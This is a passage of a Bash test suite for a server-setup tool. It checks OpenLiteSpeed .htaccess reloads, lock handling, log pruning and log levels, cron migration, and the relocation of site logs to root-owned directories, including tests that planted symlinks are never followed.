( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "the check reloads once for a waiting .htaccess" "1" "$(_ht_count)"
assert_has "and names it" "wp-content/uploads/.htaccess" "$(cat "$_ht_log")"
_ht_started="@$(( $(date +%s) - 30 ))"
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "but not within a minute of the last start" "1" "$(_ht_count)"
_ht_started="@$(( $(date +%s) - 600 ))"; _ht_flock_rc=1
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "nor while another command holds the lock" "1" "$(_ht_count)"
_ht_flock_rc=0; _ht_started="@$(( $(date +%s) + 1 ))"
( lib_ols_htaccess_check_main ) >/dev/null 2>&1
assert_eq  "and not at all when nothing changed since the last start" "1" "$(_ht_count)"
assert_eq  "the check exits 0 with errexit armed" 0 "$(run_isolated lib_ols_htaccess_check_main)"

assert_has "add --wordpress reloads once WordPress wrote its .htaccess" 'lib_ols_htaccess_reload' "$(declare -f lib_domain_add_main)"
assert_has "install schedules the check" 'lib_ols_htaccess_watch_ensure' "$(declare -f lib_install_cron_base)"
lib_ols_htaccess_watch_ensure
assert_has "the check runs every minute, as root" "* * * * * root ${BIN_LINK} htaccess-check --quiet # server-setup:htaccess" "$(cat "$CRON_FILE")"
assert_has "setup.sh: the check waits for no lock" 'htaccess-check) ;;' "$(cat "$ROOT/setup.sh")"
assert_has "setup.sh: it adds no header line to the log" '"$cmd" != "htaccess-check"' "$(cat "$ROOT/setup.sh")"
eval "$_orig_olsrun"; eval "$_orig_htreload"
unset -f systemctl flock _ht_count
rm -rf "$(lib_domain_state_dir wp.example.com)" "$(lib_domain_state_dir plain.example.com)"
lib_domain_state_reset
# From the command line WordPress cannot see that LiteSpeed takes rewrite rules: without its
# own configuration saying so, "wp rewrite --hard" wrote nothing into .htaccess
assert_has "wp-cli runs with its own configuration" 'WP_CLI_CONFIG_PATH=' "$(declare -f _wp)"
assert_has "which tells it rewrite rules work here" 'mod_rewrite' "$(declare -f lib_domain_wp_install)"
assert_has "and the install checks WordPress wrote them" 'BEGIN WordPress' "$(declare -f lib_domain_wp_install)"
# the check holds the lock for the seconds a reload takes: other commands wait for it
assert_has "a busy lock is waited for" 'flock -w' "$(declare -f lib_lock)"
if command -v flock >/dev/null 2>&1; then
  ( exec 9>"$LOCK_FILE"; flock 9; sleep 2 ) &
  _lk_pid=$!
  sleep 0.5
  assert_eq "a command waits for a lock that is released soon" 0 "$(SERVER_SETUP_LOCKED=0 LIB_LOCK_WAIT=10 run_isolated lib_lock)"
  wait "$_lk_pid" 2>/dev/null || true
  ( exec 9>"$LOCK_FILE"; flock 9; sleep 4 ) &
  _lk_pid=$!
  sleep 0.5
  assert_eq "and gives up after its limit" 1 "$(SERVER_SETUP_LOCKED=0 LIB_LOCK_WAIT=1 run_isolated lib_lock)"
  wait "$_lk_pid" 2>/dev/null || true
fi

# =============================================================================
section "OpenLiteSpeed's own logs: rolled files go after a while, live ones stay"
# OpenLiteSpeed deletes a rolled log only while it rolls the same log again, and never one of
# stderr.log's. The daily entry is a plain find, so it is run here for real, against files
# aged the way a server ages them.
assert_has "install schedules the cleanup" 'lib_ols_logs_prune_ensure' "$(declare -f lib_install_cron_base)"
lib_ols_logs_prune_ensure
_pl="$(grep '# server-setup:ols-logs$' "$CRON_FILE" || true)"
assert_has   "it runs daily, as root, over both log directories" "45 4 * * * root find -H ${LSWS_HOME}/logs ${LSWS_HOME}/admin/logs " "$_pl"
assert_has   "and keeps OLS_LOG_KEEP_DAYS days" "-mtime +${OLS_LOG_KEEP_DAYS} -delete" "$_pl"
assert_lacks "the line holds no %, which cron would turn into a line break" "%" "$_pl"
assert_has   "doctor notices a server without it" 'lib_cron_has ols-logs' "$(declare -f _doc_check_cron)"
_pl_home="$TMP/pl"; _pl_dir="$TMP/pl/logs"; _pl_adm="$TMP/pl/admin/logs"
_pl_age() { mkdir -p "$(dirname "$1")"; : >"$1"; touch -d "-$2 days" "$1"; }
_pl_old=$((OLS_LOG_KEEP_DAYS + 2)); _pl_new=$((OLS_LOG_KEEP_DAYS - 1))
_pl_live=(error.log access.log stderr.log _default.error.log lsrestart.log)
_pl_rolled=(error.log.2026_08_01 error.log.2026_08_01.01 access.log.2026_08_01.gz stderr.log.2026_08_01 _default.error.log.2026_08_01.02)
# the live logs of a quiet server are old as well: only the name may decide
for _f in "${_pl_live[@]}"; do _pl_age "${_pl_dir}/${_f}" 40; done
for _f in "${_pl_rolled[@]}"; do _pl_age "${_pl_dir}/${_f}" "$_pl_old"; done
_pl_age "${_pl_dir}/error.log.2026_09_20" "$_pl_new"
_pl_age "${_pl_dir}/notes.txt" 40
_pl_age "${_pl_dir}/error.log.2026_07_01/inner.log.2026_07_01" 40
touch -d '-40 days' "${_pl_dir}/error.log.2026_07_01"
_pl_age "${_pl_adm}/access.log" 40
_pl_age "${_pl_adm}/access.log.2026_08_01" "$_pl_old"
_pl_cmd="$(LSWS_HOME="$_pl_home" lib_ols_logs_prune_cmd)"
assert_eq "the cleanup exits 0" 0 "$(run_isolated bash -c "$_pl_cmd")"
for _f in "${_pl_live[@]}"; do assert_true "a live ${_f} stays, however old" test -e "${_pl_dir}/${_f}"; done
for _f in "${_pl_rolled[@]}"; do assert_false "an old ${_f} goes" test -e "${_pl_dir}/${_f}"; done
assert_true  "a rolled log younger than that stays" test -e "${_pl_dir}/error.log.2026_09_20"
assert_true  "a file OpenLiteSpeed did not roll stays" test -e "${_pl_dir}/notes.txt"
assert_true  "a directory with a rolled name stays, and what is in it" test -e "${_pl_dir}/error.log.2026_07_01/inner.log.2026_07_01"
assert_false "the WebAdmin's old rolled log goes" test -e "${_pl_adm}/access.log.2026_08_01"
assert_true  "and its live log stays" test -e "${_pl_adm}/access.log"
if (( CAN_SYMLINK )); then
  # a link with a rolled name is left alone, and so is the file it points at. The link itself
  # is aged too: a fresh one would stay for its age alone and prove nothing about -type f.
  _pl_age "$TMP/pl-victim" 40
  ln -s "$TMP/pl-victim" "${_pl_dir}/access.log.2026_07_02"
  touch -h -d '-40 days' "${_pl_dir}/access.log.2026_07_02"
  run_isolated bash -c "$_pl_cmd" >/dev/null
  assert_true "a link with a rolled name stays" test -L "${_pl_dir}/access.log.2026_07_02"
  assert_true "and so does the file it points at" test -e "$TMP/pl-victim"
  # a logs directory moved to another disk and linked back is still cleaned
  _pl_age "$TMP/pl-moved/error.log.2026_08_01" "$_pl_old"
  mkdir -p "$TMP/pl2/admin/logs"; ln -s "$TMP/pl-moved" "$TMP/pl2/logs"
  assert_eq    "a linked logs directory is cleaned as well" 0 "$(run_isolated bash -c "$(LSWS_HOME="$TMP/pl2" lib_ols_logs_prune_cmd)")"
  assert_false "its old rolled log is gone" test -e "$TMP/pl-moved/error.log.2026_08_01"
fi
unset -f _pl_age

# =============================================================================
section "the server log is written at NOTICE, not the package's DEBUG"
# The two log blocks are the package's own, byte for byte (dist/conf/httpd_config.conf.in).
# printf rather than a heredoc: an editor would strip the trailing blanks they carry.
_lv="$TMP/lv.conf"
printf '%s\n' \
  'user                             nobody' \
  'group                            nogroup' \
  '' \
  'errorlog logs/error.log {' \
  '        logLevel             DEBUG' \
  '        debugLevel           0' \
  '        rollingSize          10M' \
  '        enableStderrLog      1' \
  '}' \
  '    ' \
  'accessLog logs/access.log {' \
  '        rollingSize          10M    ' \
  '        keepDays             30    ' \
  '        compressArchive      0' \
  '        logReferer           1     ' \
  '        logUserAgent         1' \
  '}' \
  '    ' \
  'virtualhost inline {' \
  '  errorlog $VH_ROOT/logs/error.log {' \
  '    logLevel             DEBUG' \
  '  }' \
  '}' >"$_lv"
_lv_access="$(sed -n '/^accessLog/,/^}/p' "$_lv")"
OLS_TX_FILE="$_lv"
_ols_tx_server_log_level
assert_eq  "the server log goes to NOTICE"  "NOTICE" "$(lib_ols_tx_block_get errorlog logs/error.log logLevel)"
assert_eq  "its rolling size stays"          "10M"    "$(lib_ols_tx_block_get errorlog logs/error.log rollingSize)"
assert_eq  "and so does stderr.log"          "1"      "$(lib_ols_tx_block_get errorlog logs/error.log enableStderrLog)"
assert_eq  "the access log is not touched"   "$_lv_access" "$(sed -n '/^accessLog/,/^}/p' "$_lv")"
assert_has "nor a log nested in a virtual host" $'  errorlog $VH_ROOT/logs/error.log {\n    logLevel             DEBUG' "$(cat "$_lv")"
assert_eq  "the file still parses" 0 "$(run_isolated _ols_braces_balanced "$_lv")"
cp "$_lv" "$_lv.1"; _ols_tx_server_log_level
assert_true "a second run changes nothing" cmp -s "$_lv" "$_lv.1"
# once the WebAdmin saved it, the block is named after the full path
printf 'errorlog $SERVER_ROOT/logs/error.log {\n  logLevel                INFO\n  rollingSize             10M\n}\n' >"$_lv"
_ols_tx_server_log_level
assert_eq "a block the WebAdmin saved as well" "NOTICE" "$(lib_ols_tx_block_get errorlog '$SERVER_ROOT/logs/error.log' logLevel)"
printf 'user nobody\n' >"$_lv"; cp "$_lv" "$_lv.1"; _ols_tx_server_log_level
assert_true "without a server log block nothing is added" cmp -s "$_lv" "$_lv.1"
OLS_TX_FILE=""
assert_has "install and optimize apply it" '_ols_tx_server_log_level' "$(declare -f lib_ols_tx_apply_server_settings)"

# =============================================================================
section "update adds the scheduled tasks an older release did not write"
# self-update reconfigures nothing, so a server installed before the log cleanup existed gets
# it from update, which writes the same base tasks install does
assert_has "install writes the base tasks" 'lib_install_cron_base' "$(declare -f lib_install_cron)"
assert_has "and so does update"            'lib_install_migrate' "$(declare -f lib_update_main)"
assert_has "through what self-update runs too" 'lib_install_cron_base' "$(declare -f lib_install_migrate)"
cp "$CRON_FILE" "$TMP/cron.keep"
rm -f "$CRON_FILE"
lib_install_cron_base
assert_eq "a server with none gets all three" "healthcheck htaccess ols-logs" "$INS_CRON_ADDED"
assert_eq "and exactly the ones it names"     3 "$(grep -c '# server-setup:' "$CRON_FILE")"
# one from before the cleanup, with entries of its own after the base ones
lib_cron_set "wpcron:example.com" "*/5 * * * * example_com true"
lib_cron_set backup "0 3 * * * root ${BIN_LINK} backup --all --yes --quiet"
lib_cron_remove ols-logs
cp "$CRON_FILE" "$TMP/cron.before"
lib_install_cron_base
assert_eq  "an older server gets the one it lacks" "ols-logs" "$INS_CRON_ADDED"
assert_has "at the end" "# server-setup:ols-logs" "$(tail -n 1 "$CRON_FILE")"
assert_eq  "and every other line stays where it was" "$(cat "$TMP/cron.before")" "$(grep -v '# server-setup:ols-logs$' "$CRON_FILE")"
cp "$CRON_FILE" "$TMP/cron.after"
lib_install_cron_base
assert_eq   "a second run finds nothing missing" "" "$INS_CRON_ADDED"
assert_true "and leaves the file as it was" cmp -s "$CRON_FILE" "$TMP/cron.after"
lib_cron_remove ols-logs
cp "$CRON_FILE" "$TMP/cron.dry"
OPT_DRY_RUN=1; lib_install_cron_base >/dev/null; OPT_DRY_RUN=0
assert_eq   "a dry run names what it would add" "ols-logs" "$INS_CRON_ADDED"
assert_true "and writes nothing" cmp -s "$CRON_FILE" "$TMP/cron.dry"
cp "$TMP/cron.keep" "$CRON_FILE"

# =============================================================================
section "site logs: out of the site user's reach, and a link in the home"
# OpenLiteSpeed's main process opens a vhost's logs as root, creates them and hands them to
# nobody, whose workers write them. So they live in SITES_LOG_ROOT/<domain>, which only root may
# change, and /home/<domain>/logs - in a directory the site user owns - is only a link there.
lib_rollback_clear
lib_domain_state_reset
D_DOMAIN="logs.example.com"; D_IDENT="logs_example_com"; D_USER="logs_example_com"; D_GROUP="logs_example_com"
D_HOME="$SITES_ROOT/logs.example.com"; D_MODE="php"; D_PHP="8.3"; D_PHP_CHILDREN=4; D_MEMORY="256M"; D_UPLOAD="64M"
_ld="$SITES_LOG_ROOT/logs.example.com"
: >"$SETFACL_LOG"
assert_eq   "the directory setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
assert_true "it makes the site's log directory" test -d "$_ld"
if (( CAN_CHMOD )); then
  assert_eq "0750, as logs/ was"                      750 "$(stat -c %a "$_ld")"
  assert_eq "under a root others may only pass through" 711 "$(stat -c %a "$SITES_LOG_ROOT")"
fi
assert_has   "OpenLiteSpeed's user may enter it, never through a link" "-P -m u:nobody:x ${_ld}" "$(cat "$SETFACL_LOG")"
assert_lacks "and nothing in the home is opened for it" "u:nobody:x ${D_HOME}/logs" "$(cat "$SETFACL_LOG")"
if (( CAN_SYMLINK )); then assert_eq "logs/ in the home leads there" "$_ld" "$(readlink "${D_HOME}/logs")"; fi
: >"$SETFACL_LOG"
OPT_DRY_RUN=1; _rc="$(run_isolated lib_domain_dirs_create)"; OPT_DRY_RUN=0
assert_eq "a dry run exits 0" 0 "$_rc"
assert_eq "and sets no ACL"   "" "$(cat "$SETFACL_LOG")"
# a dry run of a site that is not there yet makes nothing at all
_sv_dom="$D_DOMAIN"; _sv_home="$D_HOME"
D_DOMAIN="dry-logs.example.com"; D_HOME="$SITES_ROOT/dry-logs.example.com"
OPT_DRY_RUN=1; _rc="$(run_isolated lib_domain_dirs_create)"; OPT_DRY_RUN=0
assert_eq    "a dry run of a new site exits 0" 0 "$_rc"
assert_false "and makes no log directory" test -e "$SITES_LOG_ROOT/dry-logs.example.com"
assert_false "nor a home"                 test -e "$D_HOME"
# a failed add takes the log directory back with a home it made - but not from a home kept from
# before, where the directory may hold the only copy of an older release's history
lib_rollback_clear
lib_domain_dirs_create >/dev/null 2>&1
assert_has   "a new home: a failed run removes its log directory too" "rm -rf '$SITES_LOG_ROOT/dry-logs.example.com'" "${LIB_ROLLBACK_STACK[*]-}"
lib_rollback_clear; rm -rf "$SITES_LOG_ROOT/dry-logs.example.com"
lib_domain_dirs_create >/dev/null 2>&1
assert_true  "a kept home gets it made again"  test -d "$SITES_LOG_ROOT/dry-logs.example.com"
assert_lacks "but not taken back by a failure" "rm -rf '$SITES_LOG_ROOT/dry-logs.example.com'" "${LIB_ROLLBACK_STACK[*]-}"
lib_rollback_clear; rm -rf "$D_HOME" "$SITES_LOG_ROOT/dry-logs.example.com"
D_DOMAIN="$_sv_dom"; D_HOME="$_sv_home"
# whatever renders the vhost has its log directory in place first: renew-ssl, proxy, app too
rm -rf "$_ld"; : >"$SETFACL_LOG"
lib_ols_vhconf_write "$D_DOMAIN"
assert_true "writing the vhost makes its log directory" test -d "$_ld"
assert_has  "open to OpenLiteSpeed"                     "-P -m u:nobody:x ${_ld}" "$(cat "$SETFACL_LOG")"
if (( CAN_SYMLINK )); then rm -rf "${D_HOME}/logs"; ln -s "$_ld" "${D_HOME}/logs"; fi
: >"$RUNUSER_LOG"
lib_ols_logdir_open "$_ld" || true
assert_has "whether they can is asked of that user" "-u nobody -- test -x ${_ld}" "$(cat "$RUNUSER_LOG")"
_vh="$(lib_ols_render_vhconf)"
assert_has   "the vhost writes its error log there" "errorlog ${_ld}/error.log {" "$_vh"
assert_has   "and its access log"                   "accesslog ${_ld}/access.log {" "$_vh"
assert_lacks "and nothing into the site's home"     '$VH_ROOT/logs' "$_vh"
# PHP's warnings, fatal errors and error_log() lines arrive as "[NOTICE] ... [STDERR]"
_lvl() { awk '/^errorlog /,/^}/' | awk '$1 == "logLevel" { print $2 }'; }
assert_eq "so the site's error log is at NOTICE" "NOTICE" "$(lib_ols_render_vhconf | _lvl)"
assert_eq "the catch-all's stays at WARN"        "WARN"   "$(lib_ols_render_default_vhconf | _lvl)"
assert_has "the webmail's log directory is opened the same way" 'lib_ols_logdir_grant "$WM_LOG_DIR"' "$(declare -f lib_webmail_dirs_ensure)"
assert_lacks "lomp logs creates no log file as root" "touch" "$(declare -f lib_domain_logs_main)"
assert_has   "and follows the directory, not the link" 'lib_domain_log_dir_in_use "$domain"' "$(declare -f lib_domain_logs_main)"
assert_has   "remove deletes the logs with the files" 'lib_rm "$D_HOME" "$(lib_domain_log_dir "$domain")"' "$(declare -f lib_domain_remove_main)"

# a link the site user put in place of logs/ is replaced, and where it led is never read or
# written; a directory of the user's own is left alone
if (( CAN_SYMLINK )); then
  mkdir -p "$TMP/lv-victim"; printf 'keep\n' >"$TMP/lv-victim/error.log"
  rm -f "${D_HOME}/logs"; ln -s "$TMP/lv-victim" "${D_HOME}/logs"
  assert_eq "a link elsewhere: the setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
  assert_eq "and logs/ leads to the log directory again" "$_ld" "$(readlink "${D_HOME}/logs")"
  assert_eq "where the other one led is as it was" "error.log" "$(ls -A "$TMP/lv-victim")"
  assert_eq "to the byte" "keep" "$(cat "$TMP/lv-victim/error.log")"
fi
rm -rf "${D_HOME}/logs"; mkdir -p "${D_HOME}/logs"; printf 'mine\n' >"${D_HOME}/logs/notes.txt"
_out="$(lib_domain_logs_link 2>&1)"
assert_true "a directory of the user's own is left alone" test -f "${D_HOME}/logs/notes.txt"
assert_has  "and named" "${D_HOME}/logs is not a link to ${_ld}" "$_out"
rm -rf "${D_HOME}/logs"

# An older release's logs/ - root's directory in the home. Once nothing writes there its
# history moves to the log directory, and it goes. The suite runs as whoever runs it, so the
# one question the move asks about the directory's owner is answered here.
eval 'stat() { if [[ "$*" == "-c %u ." && -n "${FAKE_OWNER_UID:-}" ]]; then printf "%s\n" "$FAKE_OWNER_UID"; else command stat "$@"; fi; }'
_old="${D_HOME}/logs"
_y1="$(date -d '-1 day' +%Y%m%d)"; _y2="$(date -d '-2 day' +%Y%m%d)"
_mk_old() {   # logs/ as a day of OpenLiteSpeed and logrotate leave it
  rm -rf "$_old"; mkdir -p "$_old"; chmod 0750 "$_old"
  printf 'A-live\n' >"$_old/access.log"; : >"$_old/error.log"
  printf 'A-rotated\n' >"$_old/access.log-20260101"
  printf 'E-rotated\n' | gzip -c >"$_old/error.log-20251231.gz"
}
if (( CAN_CHMOD )); then
  _mk_old
  rm -rf "$_ld"; mkdir -p "$_ld"; printf 'new\n' >"$_ld/access.log"
  printf 'taken\n' | gzip -c >"$_ld/access.log-${_y1}.gz"
  FAKE_OWNER_UID=0
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_false "the old directory goes"                 test -e "$_old"
  assert_eq    "a rotated copy keeps its name"          "A-rotated" "$(cat "$_ld/access.log-20260101")"
  assert_eq    "a compressed one too"                   "E-rotated" "$(gzip -dc "$_ld/error.log-20251231.gz")"
  # the newest copy is yesterday's, compressed: the old live log follows it as a gzip member,
  # so logrotate keeps it as long as that copy rather than deleting it first
  assert_eq    "the old live log goes at the end of the newest copy" "$(printf 'taken\nA-live')" "$(gzip -dc "$_ld/access.log-${_y1}.gz")"
  assert_false "and becomes no copy of its own"         test -e "$_ld/access.log-${_y2}.gz"
  assert_eq    "the log OpenLiteSpeed writes now is not touched" "new" "$(cat "$_ld/access.log")"
  assert_eq    "an empty one is dropped"                "error.log-20251231.gz" "$(ls "$_ld" | grep '^error\.log' | paste -sd' ' -)"
  assert_eq    "and nothing half-written stays"         "" "$(ls -A "$_ld" | grep 'lomp-tmp' || true)"
  assert_eq    "all of it quietly"                      "" "$_out"
  # a newest copy that is not compressed yet (delaycompress) gets the lines as they are
  rm -rf "$_old" "$_ld"; mkdir -p "$_old" "$_ld"; chmod 0750 "$_old"
  printf 'E-live\n' >"$_old/error.log"; printf 'E-older\n' >"$_old/error.log-20260103"; printf 'E-newest\n' >"$_old/error.log-20260104"
  lib_domain_logs_move_old >/dev/null 2>&1
  assert_eq    "a plain newest copy gets them appended" "$(printf 'E-newest\nE-live')" "$(cat "$_ld/error.log-20260104")"
  assert_eq    "and the older one is left as it was"    "E-older" "$(cat "$_ld/error.log-20260103")"
  # with no copy at all, the old live log becomes one, dated yesterday: logrotate never makes it
  rm -rf "$_old" "$_ld"; mkdir -p "$_old" "$_ld"; chmod 0750 "$_old"
  printf 'A-only\n' >"$_old/access.log"; : >"$_old/error.log"
  _d1="$(date -d '-1 day' +%Y%m%d)"
  lib_domain_logs_move_old >/dev/null 2>&1
  _d2="$(date -d '-1 day' +%Y%m%d)"   # the same day, unless the run crossed midnight
  assert_eq "with no copy it becomes one, dated yesterday" "A-only" \
    "$(gzip -dc "$_ld/access.log-${_d1}.gz" 2>/dev/null || gzip -dc "$_ld/access.log-${_d2}.gz" 2>/dev/null || true)"
  assert_eq "an empty one becomes nothing"   "" "$(ls "$_ld" | grep '^error\.log' || true)"
  assert_false "and is not left behind either" test -e "$_old"
  if (( CAN_CHMOD )); then assert_eq "readable by the site's group only" 640 "$(stat -c %a "$_ld/access.log-${_d1}.gz" 2>/dev/null || stat -c %a "$_ld/access.log-${_d2}.gz")"; fi
  # a name the log directory already has is never replaced: that file stays in the old logs/,
  # which then stays too, and the run says so
  rm -rf "$_old" "$_ld"; mkdir -p "$_old" "$_ld"; chmod 0750 "$_old"
  printf 'old\n' >"$_old/access.log-20260105"; printf 'there\n' >"$_ld/access.log-20260105"
  mkdir -p "$_old/sub"
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_eq   "a name already there is not replaced"   "there" "$(cat "$_ld/access.log-20260105")"
  assert_eq   "and the old file stays where it was"    "old" "$(cat "$_old/access.log-20260105")"
  assert_true "as does a directory in the old logs/"   test -d "$_old/sub"
  assert_has  "and the run says the rest stays there"  "could not all be moved" "$_out"
  assert_eq   "leaving nothing half-written"           "" "$(ls -A "$_ld" | grep 'lomp-tmp' || true)"
  # the directory entered is checked again from the inside, with the kernel's getcwd
  _mk_old; rm -rf "$_ld"; mkdir -p "$_ld"
  eval 'env() { if [[ "$*" == "pwd -P" && -n "${FAKE_PWD_IN_LOGS:-}" && "$PWD" == */logs ]]; then printf "%s\n" "$FAKE_PWD_IN_LOGS"; else command env "$@"; fi; }'
  FAKE_PWD_IN_LOGS="$TMP/elsewhere"
  _out="$(lib_domain_logs_move_old 2>&1)"
  unset FAKE_PWD_IN_LOGS; unset -f env
  assert_true "a directory that moved while it was entered is left alone" test -f "$_old/access.log"
  assert_has  "and named" "(it moved while it was entered)" "$_out"
  rm -rf "$_ld"; mkdir -p "$_ld"
  # ...and nothing that is not that directory
  _mk_old; FAKE_OWNER_UID=1000
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_eq  "one that is not root's is left as it is" "A-live" "$(cat "$_old/access.log")"
  assert_has "and named" "is not the log directory an older release made (it does not belong to root)" "$_out"
  _mk_old; FAKE_OWNER_UID=0; chmod 0770 "$_old"
  _out="$(lib_domain_logs_move_old 2>&1)"
  assert_true "nor one its group may write to" test -f "$_old/access.log"
  assert_has  "which is named as well" "others may write to it (mode 770)" "$_out"
  rm -rf "$_old"
  if (( CAN_SYMLINK )); then
    ln -s "$TMP/lv-victim" "$_old"
    assert_eq "a link in its place: nothing to move" 0 "$(run_isolated lib_domain_logs_move_old)"
    assert_eq "entered directly, the link is refused" 3 "$(run_isolated _domain_logs_move_old "$D_HOME" "$_ld" "$D_GROUP")"
    assert_eq "and nothing is read or moved from where it leads" "error.log" "$(ls -A "$TMP/lv-victim")"
    rm -f "$_old"
  fi
fi
unset FAKE_OWNER_UID
lib_domain_state_reset

# update moves the sites of an older release: lr1 keeps its logs in its home, lr2 is done
# already, lr3's logs/ is a link the site user planted (a file where the suite cannot make
# one), and lr4 has no logs/ at all
_orig_cb="$(declare -f lib_ols_change_begin)"; _orig_cc="$(declare -f lib_ols_change_commit)"
_orig_wi="$(declare -f lib_webmail_installed)"
_orig_wd="$(declare -f lib_webmail_dirs_ensure)"; _orig_rg="$(declare -f lib_domain_fail2ban_regen)"
_lr_calls="$TMP/lr-calls"
_lr1_old() { if [[ -d "$SITES_ROOT/lr1.example.com/logs" && ! -L "$SITES_ROOT/lr1.example.com/logs" ]]; then printf 'there'; else printf 'gone'; fi; }
# lib_ols_is_installed has no definition left here (an earlier section unset it), so this one
# is removed again below rather than restored
eval 'lib_ols_is_installed()    { return 0; }'
eval 'lib_ols_change_begin()    { OLS_PENDING_RELOAD=0; printf "begin\n" >>"$_lr_calls"; }'
# the old logs/ has to be there still when OpenLiteSpeed is reloaded: nothing moves before
eval 'lib_ols_change_commit()   { printf "commit %s pending=%s lr1-old=%s\n" "$1" "$OLS_PENDING_RELOAD" "$(_lr1_old)" >>"$_lr_calls"; OLS_PENDING_RELOAD=0; }'
eval 'lib_webmail_installed()   { return 1; }'
eval 'lib_webmail_dirs_ensure() { printf "webmail dirs\n" >>"$_lr_calls"; }'
eval 'lib_domain_fail2ban_regen() { printf "f2b lr1-old=%s\n" "$(_lr1_old)" >>"$_lr_calls"; }'
FAKE_OWNER_UID=0
_state_save="$STATE_DIR"; STATE_DIR="$TMP/lr-state"
for _d in lr1.example.com lr2.example.com lr3.example.com lr4.example.com; do
  _i="${_d//./_}"
  mkdir -p "$STATE_DIR/domains/$_d" "$SITES_ROOT/$_d/public_html"
  jq -n --arg d "$_d" --arg i "$_i" --arg h "$SITES_ROOT/$_d" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:"php",
      php:{version:"8.3", children:4, memory_limit:"256M", upload_max:"64M"}}' >"$STATE_DIR/domains/$_d/domain.json"
done
_lr_old_vhconf() { printf 'errorlog $VH_ROOT/logs/error.log {\n  logLevel                WARN\n}\n'; }
mkdir -p "$SITES_ROOT/lr1.example.com/logs"; chmod 0750 "$SITES_ROOT/lr1.example.com/logs"
printf 'lr1-live\n' >"$SITES_ROOT/lr1.example.com/logs/access.log"
printf 'lr1-rotated\n' >"$SITES_ROOT/lr1.example.com/logs/access.log-20260102"
mkdir -p "$SITES_LOG_ROOT/lr2.example.com"
if (( CAN_SYMLINK )); then
  ln -s "$SITES_LOG_ROOT/lr2.example.com" "$SITES_ROOT/lr2.example.com/logs"
  mkdir -p "$TMP/lr-victim"; printf 'v\n' >"$TMP/lr-victim/access.log"
  ln -s "$TMP/lr-victim" "$SITES_ROOT/lr3.example.com/logs"
else
  : >"$SITES_ROOT/lr3.example.com/logs"
fi
for _d in lr1 lr3; do
  mkdir -p "$LSWS_VHOSTS_DIR/${_d}.example.com"; _lr_old_vhconf >"$LSWS_VHOSTS_DIR/${_d}.example.com/vhconf.conf"
done
# until update moves them, what reads the logs reads them where OpenLiteSpeed writes them
lib_domain_logrotate_regen
assert_has "until update, logrotate rotates lr1's logs where they are written" "${SITES_ROOT}/lr1.example.com/logs/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_has "and lr2's in its log directory"                                   "${SITES_LOG_ROOT}/lr2.example.com/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_eq  "lomp logs follows the same place" "${SITES_ROOT}/lr1.example.com/logs" "$(lib_domain_log_dir_in_use lr1.example.com)"
: >"$SETFACL_LOG"; : >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_eq "the sites that still logged into their homes are named" "lr1.example.com lr3.example.com" "$DOMAIN_LOGS_MOVED"
assert_eq "no vhost writes into a home any more" "" "$(grep -l '$VH_ROOT/logs' "$LSWS_VHOSTS_DIR"/lr?.example.com/vhconf.conf || true)"
assert_eq "every vhost is rendered again, its error log at NOTICE" "NOTICE NOTICE NOTICE NOTICE" \
  "$(for _d in lr1 lr2 lr3 lr4; do _lvl <"$LSWS_VHOSTS_DIR/${_d}.example.com/vhconf.conf"; done | paste -sd' ' -)"
for _d in lr1 lr2 lr3 lr4; do
  assert_has "${_d} has its log directory, open to OpenLiteSpeed" "-P -m u:nobody:x ${SITES_LOG_ROOT}/${_d}.example.com" "$(cat "$SETFACL_LOG")"
done
assert_eq "one change set, reloaded, then what reads the logs - all before anything moves" \
  "begin|commit site logs pending=1 lr1-old=there|f2b lr1-old=there" "$(paste -sd'|' - <"$_lr_calls")"
if (( CAN_CHMOD )); then
  assert_eq   "lr1's history is in its log directory, its last live log at the end of the newest copy" \
    "$(printf 'lr1-rotated\nlr1-live')" "$(cat "$SITES_LOG_ROOT/lr1.example.com/access.log-20260102")"
  assert_false "and its old logs/ is gone"            test -d "$SITES_ROOT/lr1.example.com/logs" -a ! -L "$SITES_ROOT/lr1.example.com/logs"
fi
if (( CAN_SYMLINK )); then
  if (( CAN_CHMOD )); then assert_eq "its logs/ leads there now" "${SITES_LOG_ROOT}/lr1.example.com" "$(readlink "$SITES_ROOT/lr1.example.com/logs")"; fi
  assert_eq "the planted link is replaced"             "${SITES_LOG_ROOT}/lr3.example.com" "$(readlink "$SITES_ROOT/lr3.example.com/logs")"
  assert_eq "and nothing reached where it led"         "access.log" "$(ls -A "$TMP/lr-victim")"
  assert_eq "a site with no logs/ gets the link"       "${SITES_LOG_ROOT}/lr4.example.com" "$(readlink "$SITES_ROOT/lr4.example.com/logs")"
else
  assert_true "a file in place of logs/ is left alone" test -f "$SITES_ROOT/lr3.example.com/logs"
fi
assert_has   "logrotate reads the log directories" "${SITES_LOG_ROOT}/lr1.example.com/*.log" "$(cat "$LOGROTATE_SITES_FILE")"
assert_lacks "and no longer the homes"             "${SITES_ROOT}/lr1.example.com/logs" "$(cat "$LOGROTATE_SITES_FILE")"
# a second run has nothing to move and nothing to reload, once OpenLiteSpeed made every log
for _d in lr1 lr2 lr3 lr4; do : >>"$SITES_LOG_ROOT/${_d}.example.com/access.log"; done
: >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_eq  "a second run names nothing" "" "$DOMAIN_LOGS_MOVED"
assert_has "and reloads nothing"        "commit site logs pending=0" "$(cat "$_lr_calls")"
# a log directory somebody emptied gets its logs back only from a reload
rm -f "$SITES_LOG_ROOT/lr2.example.com/access.log"
: >"$_lr_calls"
lib_domain_logs_repair >"$TMP/lr-out" 2>&1
assert_has "a missing access.log is a reason to reload" "commit site logs pending=1" "$(cat "$_lr_calls")"
: >>"$SITES_LOG_ROOT/lr2.example.com/access.log"
# a dry run says what it would do and does none of it
rm -rf "$SITES_ROOT/lr1.example.com/logs" "$SITES_LOG_ROOT/lr1.example.com"
